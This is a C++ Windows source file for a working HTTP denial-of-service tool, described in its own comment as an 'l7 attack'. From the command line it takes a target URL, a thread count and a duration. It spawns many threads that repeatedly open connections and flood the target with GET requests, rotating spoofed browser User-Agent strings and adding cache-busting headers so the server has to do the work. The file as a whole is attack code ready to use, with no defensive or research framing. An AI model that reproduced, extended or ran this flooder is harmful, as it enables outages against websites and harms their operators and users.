#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <cstdlib>
#include <ctime>
#include <algorithm>
#pragma comment(lib, "ws2_32.lib")

const std::vector<std::string> userAgents = {
    "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:15.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/6.2; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+",
    "Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU",
    "Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H143 Safari/600.1.4",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321",
    "Mozilla/5.0 (iPad; CPU OS 7_0_3 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B511 Safari/9537.53",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10"
};

// gen random seed
std::string grs(int length) {
    const std::string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    std::string result;
    result.resize(length);
    std::generate_n(result.begin(), length, [&](){ return chars[rand() % chars.size()]; });
    return result;
}

// creates socket
SOCKET cs(const std::string& remote, int port) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    sockaddr_in addr;
    struct addrinfo* result = nullptr;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return INVALID_SOCKET;
    }

    addrinfo hints = {0};
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(remote.c_str(), std::to_string(port).c_str(), &hints, &result) != 0) {
        std::cerr << "getaddrinfo failed\n";
        WSACleanup();
        return INVALID_SOCKET;
    }

    sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (sock == INVALID_SOCKET) {
        std::cerr << "socket creation failed\n";
        freeaddrinfo(result);
        WSACleanup();
        return INVALID_SOCKET;
    }

    if (connect(sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
        std::cerr << "connection failed\n";
        closesocket(sock);
        sock = INVALID_SOCKET;
    }

    freeaddrinfo(result);
    return sock;
}

// sends requests
void sr(int maxRequests, const std::string& host, int port, int time) {
    SOCKET sock;
    std::string packet;
    std::string randSeed = grs(30);
    std::string userAgent;

    auto endTime = std::chrono::steady_clock::now() + std::chrono::seconds(time);
    while (std::chrono::steady_clock::now() < endTime) {
        sock = cs(host, port);
        if (sock == INVALID_SOCKET) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            continue;
        }

        for (int i = 0; i < maxRequests; ++i) {
            userAgent = userAgents[rand() % userAgents.size()];
            packet = "GET / HTTP/1.1\r\nHost: " + host + "\r\nUser-Agent: " + userAgent +
                     "\r\nIf-None-Match: " + randSeed + "\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\n" +
                     "Accept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\n" +
                     "Accept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n" +
                     "Content-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
            send(sock, packet.c_str(), (int)packet.size(), 0);
        }

        closesocket(sock);
    }
}

// l7 attack
void l7(const std::string& url, int maxThreads, int time) {
    std::string host = url.substr(url.find("//") + 2);
    int port = 80;

    if (size_t pos = host.find('/'); pos != std::string::npos) {
        host = host.substr(0, pos);
    }

    std::vector<std::thread> threads;
    for (int i = 0; i < maxThreads; ++i) {
        threads.emplace_back(sr, maxThreads, host, port, time);
    }

    for (auto& t : threads) {
        t.join();
    }
}

int main(int argc, char* argv[]) {
    if (argc > 2) {
        std::srand(static_cast<unsigned>(std::time(nullptr)));
        std::string url = argv[1];
        int maxThreads = std::stoi(argv[2]);
        int time = (argc > 3) ? std::stoi(argv[3]) : 0;

        l7(url, maxThreads, time);
    } else {
        std::cerr << "Usage: " << argv[0] << " [url] [threads] [time]\n";
        return 1;
    }

    WSACleanup();
    return 0;
}
